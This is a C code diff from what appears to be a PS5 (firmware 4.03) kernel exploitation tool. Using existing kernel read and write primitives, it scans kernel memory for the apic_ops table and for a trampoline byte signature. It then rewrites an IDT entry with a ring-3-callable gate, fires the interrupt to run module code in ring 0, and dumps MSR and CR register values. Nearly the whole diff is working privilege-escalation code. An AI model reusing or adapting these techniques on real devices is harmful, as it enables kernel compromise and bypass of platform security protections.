@@ -283,48 +283,186 @@ static void discover_sysent(void) {
 
 /* ─── apic_ops discovery ─── */
 
+#define APIC_OPS_KNOWN_OFFSET  0x170650  /* Known offset on FW 4.03 */
+#define APIC_OPS_KNOWN_COUNT   28
+
+/* Check if value looks like a ktext function pointer */
+static int is_ktext_ptr(uint64_t val) {
+    return (val >= g_ktext_base &&
+            val < g_ktext_base + 0x2000000 &&
+            (val & 0x3) == 0);
+}
+
 static void discover_apic_ops(void) {
     printf("\n[*] Discovering apic_ops table...\n");
 
-    /* Scan kdata for a table of function pointers into ktext.
-     * apic_ops is a vtable with ~28 entries, all pointing to ktext. */
-    uint64_t ktext_lo = g_ktext_base;
-    uint64_t ktext_hi = g_ktext_base + 0x2000000;
-
-    /* Scan known region around the expected offset */
-    uint64_t scan_start = g_kdata_base + 0x160000;
-    uint64_t scan_end   = g_kdata_base + 0x180000;
-
-    for (uint64_t addr = scan_start; addr < scan_end; addr += 8) {
-        uint64_t pa = va_to_pa(addr);
-        if (!pa) continue;
-
-        /* Read 28 consecutive uint64_t values */
-        uint64_t vals[28];
-        uint64_t block_pa = va_to_pa(addr);
-        if (!block_pa) continue;
-        kernel_copyout(g_dmap_base + block_pa, vals, sizeof(vals));
-
-        /* Check if all 28 values look like ktext pointers */
-        int good = 0;
-        for (int i = 0; i < 28; i++) {
-            if (vals[i] >= ktext_lo && vals[i] < ktext_hi)
-                good++;
-        }
-
-        if (good >= 20) {
-            g_apic_ops_addr = addr;
-            g_apic_ops_count = 28;
-            printf("[+] apic_ops at 0x%lx (kdata+0x%lx), %d/28 ktext ptrs\n",
-                   (unsigned long)addr,
-                   (unsigned long)(addr - g_kdata_base),
-                   good);
-            printf("    slot[2] (xapic_mode) = 0x%016lx\n",
-                   (unsigned long)vals[2]);
-            return;
+    /* ── Direct check at known FW 4.03 offset ── */
+    {
+        uint64_t known_kva = g_kdata_base + APIC_OPS_KNOWN_OFFSET;
+        uint64_t known_pa = va_to_pa(known_kva);
+        printf("[*] Direct check at known offset kdata+0x%x...\n",
+               APIC_OPS_KNOWN_OFFSET);
+        if (known_pa && known_pa < MAX_SAFE_PA) {
+            uint64_t ptrs[40];
+            kernel_copyout(g_dmap_base + known_pa, ptrs, sizeof(ptrs));
+            int run = 0;
+            for (int i = 0; i < 40; i++) {
+                if (is_ktext_ptr(ptrs[i])) run++;
+                else break;
+            }
+            if (run >= 20) {
+                g_apic_ops_addr = known_kva;
+                g_apic_ops_count = run;
+                printf("[+] CONFIRMED: apic_ops at kdata+0x%x (%d entries)\n",
+                       APIC_OPS_KNOWN_OFFSET, run);
+                printf("    slot[2] (xapic_mode) = 0x%016lx (ktext+0x%lx)\n",
+                       (unsigned long)ptrs[2],
+                       (unsigned long)(ptrs[2] - g_ktext_base));
+                return;
+            }
+            printf("    Only %d consecutive ktext ptrs at known offset\n", run);
+        } else {
+            printf("    Page not mapped at known offset\n");
         }
     }
-    printf("[-] apic_ops not found in scan range\n");
+
+    /* ── Full scan: read kdata in 4KB chunks via DMAP ──
+     *
+     * Read page-sized chunks to avoid cross-page reads.
+     * Track runs of consecutive ktext pointers across chunk boundaries.
+     * Score candidates by entry count, uniqueness, and spread. */
+    printf("[*] Full scan: kdata 8MB for apic_ops...\n");
+
+    #define APIC_SCAN_SIZE   0x800000  /* 8MB */
+    #define APIC_SCAN_CHUNK  0x1000    /* 4KB per read */
+
+    int best_len = 0, best_score = 0;
+    uint64_t best_addr = 0;
+    int run_len = 0;
+    uint64_t run_start = 0;
+    uint8_t chunk[APIC_SCAN_CHUNK];
+
+    for (uint64_t off = 0; off < APIC_SCAN_SIZE; off += APIC_SCAN_CHUNK) {
+        uint64_t scan_kva = g_kdata_base + off;
+        uint64_t scan_pa = va_to_pa(scan_kva);
+        if (!scan_pa || scan_pa >= MAX_SAFE_PA) {
+            /* Page not mapped — end any current run */
+            if (run_len >= 4) goto score_run;
+            run_len = 0;
+            continue;
+        }
+
+        kernel_copyout(g_dmap_base + scan_pa, chunk, APIC_SCAN_CHUNK);
+        uint64_t *qwords = (uint64_t *)chunk;
+        int nqwords = APIC_SCAN_CHUNK / 8;
+
+        for (int qi = 0; qi < nqwords; qi++) {
+            if (is_ktext_ptr(qwords[qi])) {
+                if (run_len == 0)
+                    run_start = scan_kva + qi * 8;
+                run_len++;
+            } else {
+                if (run_len >= 4) goto score_run;
+                run_len = 0;
+                continue;
+            score_run: ;
+                /* Score this candidate */
+                if (run_len >= 26 && run_len <= 32) {
+                    /* Re-read the full table from run_start */
+                    uint64_t rs_pa = va_to_pa(run_start);
+                    if (rs_pa && rs_pa < MAX_SAFE_PA) {
+                        uint64_t tbl[40];
+                        int cnt = run_len;
+                        if (cnt > 40) cnt = 40;
+                        kernel_copyout(g_dmap_base + rs_pa, tbl, cnt * 8);
+
+                        /* Compute uniqueness and spread */
+                        int uniq = 0;
+                        uint64_t pmin = tbl[0], pmax = tbl[0];
+                        for (int u = 0; u < cnt; u++) {
+                            if (tbl[u] < pmin) pmin = tbl[u];
+                            if (tbl[u] > pmax) pmax = tbl[u];
+                            int dup = 0;
+                            for (int v = 0; v < u; v++)
+                                if (tbl[v] == tbl[u]) { dup = 1; break; }
+                            if (!dup) uniq++;
+                        }
+                        uint64_t spread = pmax - pmin;
+
+                        int score = 0;
+                        if (cnt == 28) score += 15;
+                        else if (cnt >= 26 && cnt <= 30) score += 10;
+                        /* Real apic_ops: spread 4KB-64KB */
+                        if (spread >= 0x1000 && spread <= 0x10000) score += 20;
+                        score += uniq;
+                        /* Require slot[2] to be a valid ktext ptr */
+                        if (cnt > 2 && is_ktext_ptr(tbl[2])) score += 10;
+
+                        printf("    [TABLE] kdata+0x%lx: %d entries, %d unique, "
+                               "spread=%luKB, score=%d\n",
+                               (unsigned long)(run_start - g_kdata_base),
+                               cnt, uniq,
+                               (unsigned long)(spread >> 10), score);
+
+                        if (score > best_score) {
+                            best_score = score;
+                            best_len = cnt;
+                            best_addr = run_start;
+                        }
+                    }
+                }
+                run_len = 0;
+            }
+        }
+    }
+    /* Handle final run */
+    if (run_len >= 26 && run_len <= 32) {
+        uint64_t rs_pa = va_to_pa(run_start);
+        if (rs_pa && rs_pa < MAX_SAFE_PA) {
+            uint64_t tbl[40];
+            int cnt = run_len;
+            if (cnt > 40) cnt = 40;
+            kernel_copyout(g_dmap_base + rs_pa, tbl, cnt * 8);
+            int uniq = 0;
+            for (int u = 0; u < cnt; u++) {
+                int dup = 0;
+                for (int v = 0; v < u; v++)
+                    if (tbl[v] == tbl[u]) { dup = 1; break; }
+                if (!dup) uniq++;
+            }
+            int score = (cnt == 28 ? 15 : 10) + uniq;
+            if (cnt > 2 && is_ktext_ptr(tbl[2])) score += 10;
+            if (score > best_score) {
+                best_score = score;
+                best_len = cnt;
+                best_addr = run_start;
+            }
+        }
+    }
+
+    if (best_addr) {
+        g_apic_ops_addr = best_addr;
+        g_apic_ops_count = best_len;
+
+        /* Read and display the winning table */
+        uint64_t pa = va_to_pa(best_addr);
+        uint64_t tbl[40];
+        kernel_copyout(g_dmap_base + pa, tbl, best_len * 8);
+        printf("[+] apic_ops at 0x%lx (kdata+0x%lx), %d entries, score=%d\n",
+               (unsigned long)best_addr,
+               (unsigned long)(best_addr - g_kdata_base),
+               best_len, best_score);
+        printf("    slot[2] (xapic_mode) = 0x%016lx (ktext+0x%lx)\n",
+               (unsigned long)tbl[2],
+               (unsigned long)(tbl[2] - g_ktext_base));
+        for (int i = 0; i < best_len; i++) {
+            printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                   i, (unsigned long)tbl[i],
+                   (unsigned long)(tbl[i] - g_ktext_base));
+        }
+    } else {
+        printf("[-] apic_ops not found in 8MB scan\n");
+    }
 }
 
 /* ─── Kmod loading infrastructure ─── */
@@ -473,6 +611,21 @@ static void load_kmod(void) {
     }
     g_kmod_kid = kid;
 
+    /* Get kldstat info */
+    struct kld_file_stat kfs;
+    memset(&kfs, 0, sizeof(kfs));
+    if (kid > 0) {
+        kfs.version = sizeof(kfs);
+        int ks_ret = syscall(SYS_kldstat, kid, &kfs);
+        if (ks_ret == 0 && kfs.address != 0) {
+            printf("[+] kldstat: base=0x%lx size=0x%lx\n",
+                   (unsigned long)kfs.address, (unsigned long)kfs.size);
+        } else {
+            printf("[*] kldstat: address=0x%lx (may need scanner)\n",
+                   (unsigned long)(uintptr_t)kfs.address);
+        }
+    }
+
     /* Poll for SYSINIT */
     struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;
     uint64_t first_qword;
@@ -489,11 +642,226 @@ static void load_kmod(void) {
         }
     }
 
+    /* ── If SYSINIT didn't fire, scan for trampoline + IDT invoke ──
+     *
+     * PS5 FW 4.03 does NOT process SYSINIT or MOD_LOAD for kldload'd
+     * modules. We locate hv_idt_trampoline in kernel memory by scanning
+     * for its machine code signature, then hook an IDT entry to invoke it. */
+    if (first_qword == 0) {
+        printf("\n[*] SYSINIT did not fire — scanning for trampoline...\n");
+
+        /* hv_idt_trampoline signature */
+        static const uint8_t tramp_prefix[] = {
+            0x50, 0x51, 0x52, 0x56, 0x57,                         /* push rax..rdi */
+            0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,       /* push r8..r11 */
+            0x31, 0xff                                              /* xor edi,edi */
+        };
+        static const uint8_t tramp_suffix[] = {
+            0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58,       /* pop r11..r8 */
+            0x5f, 0x5e, 0x5a, 0x59, 0x58,                         /* pop rdi..rax */
+            0x48, 0xcf                                              /* iretq */
+        };
+        const int suffix_off = 0x14;
+
+        uint64_t trampoline_kva = 0;
+        uint8_t hdr[256];
+
+        /* Try kldstat-reported base first */
+        if (kfs.address != 0) {
+            uint64_t mod_pa = va_to_pa(kfs.address);
+            if (mod_pa && mod_pa < MAX_SAFE_PA) {
+                if (kernel_copyout(g_dmap_base + mod_pa, hdr, sizeof(hdr)) == 0) {
+                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                        trampoline_kva = kfs.address;
+                        printf("[+] Trampoline at kldstat base 0x%lx\n",
+                               (unsigned long)trampoline_kva);
+                    }
+                }
+            }
+        }
+
+        /* Hierarchical page-table scan of kdata→top */
+        if (!trampoline_kva) {
+            printf("[*] Hierarchical scan: kdata → top...\n");
+            fflush(stdout);
+
+            uint64_t rs = g_kdata_base, re = 0xFFFFFFFFFFE00000ULL;
+            uint64_t va = rs & ~0x1FFFFFULL;
+            uint64_t pages_checked = 0;
+
+            #define VA_NEXT_2MB(va, re) do { \
+                uint64_t _old = (va); (va) += (1ULL << 21); \
+                if ((va) <= _old) (va) = (re); \
+            } while (0)
+
+            for (; va < re && !trampoline_kva; ) {
+                uint64_t pml4e;
+                kernel_copyout(g_dmap_base + g_cr3_phys +
+                               ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
+                if (!(pml4e & PTE_PRESENT)) {
+                    uint64_t n = (va + (1ULL << 39)) & ~((1ULL << 39) - 1);
+                    if (n <= va) break; va = n; continue;
+                }
+                uint64_t pdpt_pa = pml4e & PTE_PA_MASK;
+                if (pdpt_pa >= MAX_SAFE_PA) {
+                    uint64_t n = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
+                    if (n <= va) break; va = n; continue;
+                }
+                uint64_t pdpte;
+                kernel_copyout(g_dmap_base + pdpt_pa +
+                               ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
+                if (!(pdpte & PTE_PRESENT) || (pdpte & PTE_PS)) {
+                    uint64_t n = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
+                    if (n <= va) break; va = n; continue;
+                }
+                uint64_t pd_pa = pdpte & PTE_PA_MASK;
+                if (pd_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
+                uint64_t pde;
+                kernel_copyout(g_dmap_base + pd_pa +
+                               ((va >> 21) & 0x1FF) * 8, &pde, 8);
+                if (!(pde & PTE_PRESENT)) { VA_NEXT_2MB(va, re); continue; }
+
+                if (pde & PTE_PS) {
+                    /* 2MB huge page — check each 4KB */
+                    uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
+                    if (base_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
+                    uint64_t cs = va & ~0x1FFFFFULL;
+                    for (int pi = 0; pi < 512 && !trampoline_kva; pi++) {
+                        uint64_t pva = cs + (uint64_t)pi * 0x1000;
+                        if (pva < rs) continue;
+                        uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
+                        if (pa >= MAX_SAFE_PA) continue;
+                        uint8_t pg[4096];
+                        if (kernel_copyout(g_dmap_base + pa, pg, 4096) != 0) continue;
+                        pages_checked++;
+                        for (int off = 0; off <= 4096 - suffix_off - (int)sizeof(tramp_suffix); off++) {
+                            if (memcmp(pg + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                                memcmp(pg + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                                trampoline_kva = pva + off;
+                                memcpy(hdr, pg + off, (4096 - off > 256) ? 256 : 4096 - off);
+                            }
+                        }
+                    }
+                    VA_NEXT_2MB(va, re); continue;
+                }
+
+                /* 4KB pages: bulk-read PT */
+                uint64_t pt_pa = pde & PTE_PA_MASK;
+                if (pt_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
+                uint64_t pt_entries[512];
+                kernel_copyout(g_dmap_base + pt_pa, pt_entries, sizeof(pt_entries));
+                uint64_t cs = va & ~0x1FFFFFULL;
+                for (int pi = 0; pi < 512 && !trampoline_kva; pi++) {
+                    uint64_t pva = cs + (uint64_t)pi * 0x1000;
+                    if (pva < rs) continue;
+                    if (!(pt_entries[pi] & PTE_PRESENT)) continue;
+                    uint64_t pa = pt_entries[pi] & PTE_PA_MASK;
+                    if (pa >= MAX_SAFE_PA) continue;
+                    uint8_t pg[4096];
+                    if (kernel_copyout(g_dmap_base + pa, pg, 4096) != 0) continue;
+                    pages_checked++;
+                    for (int off = 0; off <= 4096 - suffix_off - (int)sizeof(tramp_suffix); off++) {
+                        if (memcmp(pg + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                            memcmp(pg + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                            trampoline_kva = pva + off;
+                            memcpy(hdr, pg + off, (4096 - off > 256) ? 256 : 4096 - off);
+                        }
+                    }
+                }
+                VA_NEXT_2MB(va, re);
+            }
+            printf("    Scanned %lu pages\n", (unsigned long)pages_checked);
+        }
+
+        if (trampoline_kva) {
+            printf("[+] FOUND trampoline at 0x%lx\n", (unsigned long)trampoline_kva);
+
+            /* Hook a free IDT vector and trigger INT to invoke hv_init */
+            uint64_t idt_kva = g_kdata_base + KSTUFF_IDT_OFF;
+
+            /* Find a free IDT vector (try 0x42-0x4F, low-traffic) */
+            int hook_vec = -1;
+            for (int v = 0x42; v <= 0x4F; v++) {
+                uint64_t gate_pa = va_to_pa(idt_kva + v * 16);
+                if (!gate_pa) continue;
+                uint8_t gate[16];
+                kernel_copyout(g_dmap_base + gate_pa, gate, 16);
+                /* Check if P bit is clear (unused) or handler is Xjustreturn */
+                if (!(gate[5] & 0x80)) {
+                    hook_vec = v;
+                    break;
+                }
+            }
+            /* Fallback: use vector 0x42 anyway */
+            if (hook_vec < 0) hook_vec = 0x42;
+
+            uint64_t gate_pa = va_to_pa(idt_kva + hook_vec * 16);
+            if (gate_pa) {
+                /* Save original gate */
+                uint8_t orig_gate[16];
+                kernel_copyout(g_dmap_base + gate_pa, orig_gate, 16);
+
+                /* Build new IDT gate pointing to trampoline */
+                uint8_t new_gate[16];
+                memset(new_gate, 0, 16);
+                new_gate[0] = (uint8_t)(trampoline_kva & 0xFF);
+                new_gate[1] = (uint8_t)((trampoline_kva >> 8) & 0xFF);
+                /* selector: same as IDT[0] (kernel CS) */
+                uint64_t idt0_pa = va_to_pa(idt_kva);
+                uint8_t idt0[16];
+                kernel_copyout(g_dmap_base + idt0_pa, idt0, 16);
+                new_gate[2] = idt0[2]; new_gate[3] = idt0[3]; /* selector */
+                new_gate[4] = 0;       /* IST=0 */
+                new_gate[5] = 0xEE;    /* P=1, DPL=3, interrupt gate (allows INT from ring 3) */
+                new_gate[6] = (uint8_t)((trampoline_kva >> 16) & 0xFF);
+                new_gate[7] = (uint8_t)((trampoline_kva >> 24) & 0xFF);
+                *(uint32_t *)&new_gate[8] = (uint32_t)(trampoline_kva >> 32);
+
+                /* Install hook */
+                kernel_copyin(new_gate, g_dmap_base + gate_pa, 16);
+                printf("[+] IDT[0x%x] hooked -> trampoline 0x%lx\n",
+                       hook_vec, (unsigned long)trampoline_kva);
+
+                /* Trigger the interrupt from ring 3 */
+                printf("[*] Triggering INT 0x%x...\n", hook_vec);
+                fflush(stdout);
+
+                switch (hook_vec) {
+                    case 0x42: __asm__ volatile("int $0x42" ::: "memory"); break;
+                    case 0x43: __asm__ volatile("int $0x43" ::: "memory"); break;
+                    case 0x44: __asm__ volatile("int $0x44" ::: "memory"); break;
+                    case 0x45: __asm__ volatile("int $0x45" ::: "memory"); break;
+                    case 0x46: __asm__ volatile("int $0x46" ::: "memory"); break;
+                    case 0x47: __asm__ volatile("int $0x47" ::: "memory"); break;
+                    case 0x48: __asm__ volatile("int $0x48" ::: "memory"); break;
+                    case 0x49: __asm__ volatile("int $0x49" ::: "memory"); break;
+                    case 0x4A: __asm__ volatile("int $0x4A" ::: "memory"); break;
+                    case 0x4B: __asm__ volatile("int $0x4B" ::: "memory"); break;
+                    case 0x4C: __asm__ volatile("int $0x4C" ::: "memory"); break;
+                    case 0x4D: __asm__ volatile("int $0x4D" ::: "memory"); break;
+                    case 0x4E: __asm__ volatile("int $0x4E" ::: "memory"); break;
+                    case 0x4F: __asm__ volatile("int $0x4F" ::: "memory"); break;
+                    default:   __asm__ volatile("int $0x42" ::: "memory"); break;
+                }
+                printf("[+] INT 0x%x returned to userland!\n", hook_vec);
+
+                /* Restore original gate immediately */
+                kernel_copyin(orig_gate, g_dmap_base + gate_pa, 16);
+                printf("[+] IDT[0x%x] restored\n", hook_vec);
+
+                /* Re-read result buffer */
+                memcpy(&first_qword, (void *)result_vaddr, 8);
+            }
+        } else {
+            printf("[-] Trampoline not found in kernel memory\n");
+        }
+    }
+
     /* Read results */
     if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
-        printf("[+] Kmod init completed successfully.\n");
+        printf("\n[+] Kmod init completed successfully.\n");
 
-        /* Print MSR results */
         printf("\n[*] MSR/CR values from ring 0:\n");
         for (uint32_t i = 0; i < results->num_msr_results; i++) {
             if (!results->msr_results[i].valid) continue;
@@ -514,10 +882,8 @@ static void load_kmod(void) {
                 case 0xFFFF0004: name = "CR4"; break;
             }
             printf("    %-10s (0x%08x) = 0x%016lx\n", name, id, (unsigned long)val);
-
-            /* Special: LSTAR gives us the syscall entry point */
             if (id == 0xC0000082) {
-                printf("    → LSTAR is in ktext+0x%lx\n",
+                printf("    → LSTAR is ktext+0x%lx\n",
                        (unsigned long)(val - g_ktext_base));
             }
         }
@@ -529,10 +895,10 @@ static void load_kmod(void) {
     } else {
         printf("[!] Kmod init did not complete (magic=0x%lx status=%u)\n",
                (unsigned long)results->magic, results->status);
-        printf("    SYSINIT may not have fired — continuing anyway.\n");
+        printf("    First qword: 0x%016lx\n", (unsigned long)first_qword);
     }
 
-    /* Unload to allow re-runs */
+    /* Unload — DO NOT unload if trampoline was found and may still be needed */
     if (kid > 0) {
         syscall(SYS_kldunload, kid);
         printf("[*] Unloaded kmod (kid=%d)\n", kid);
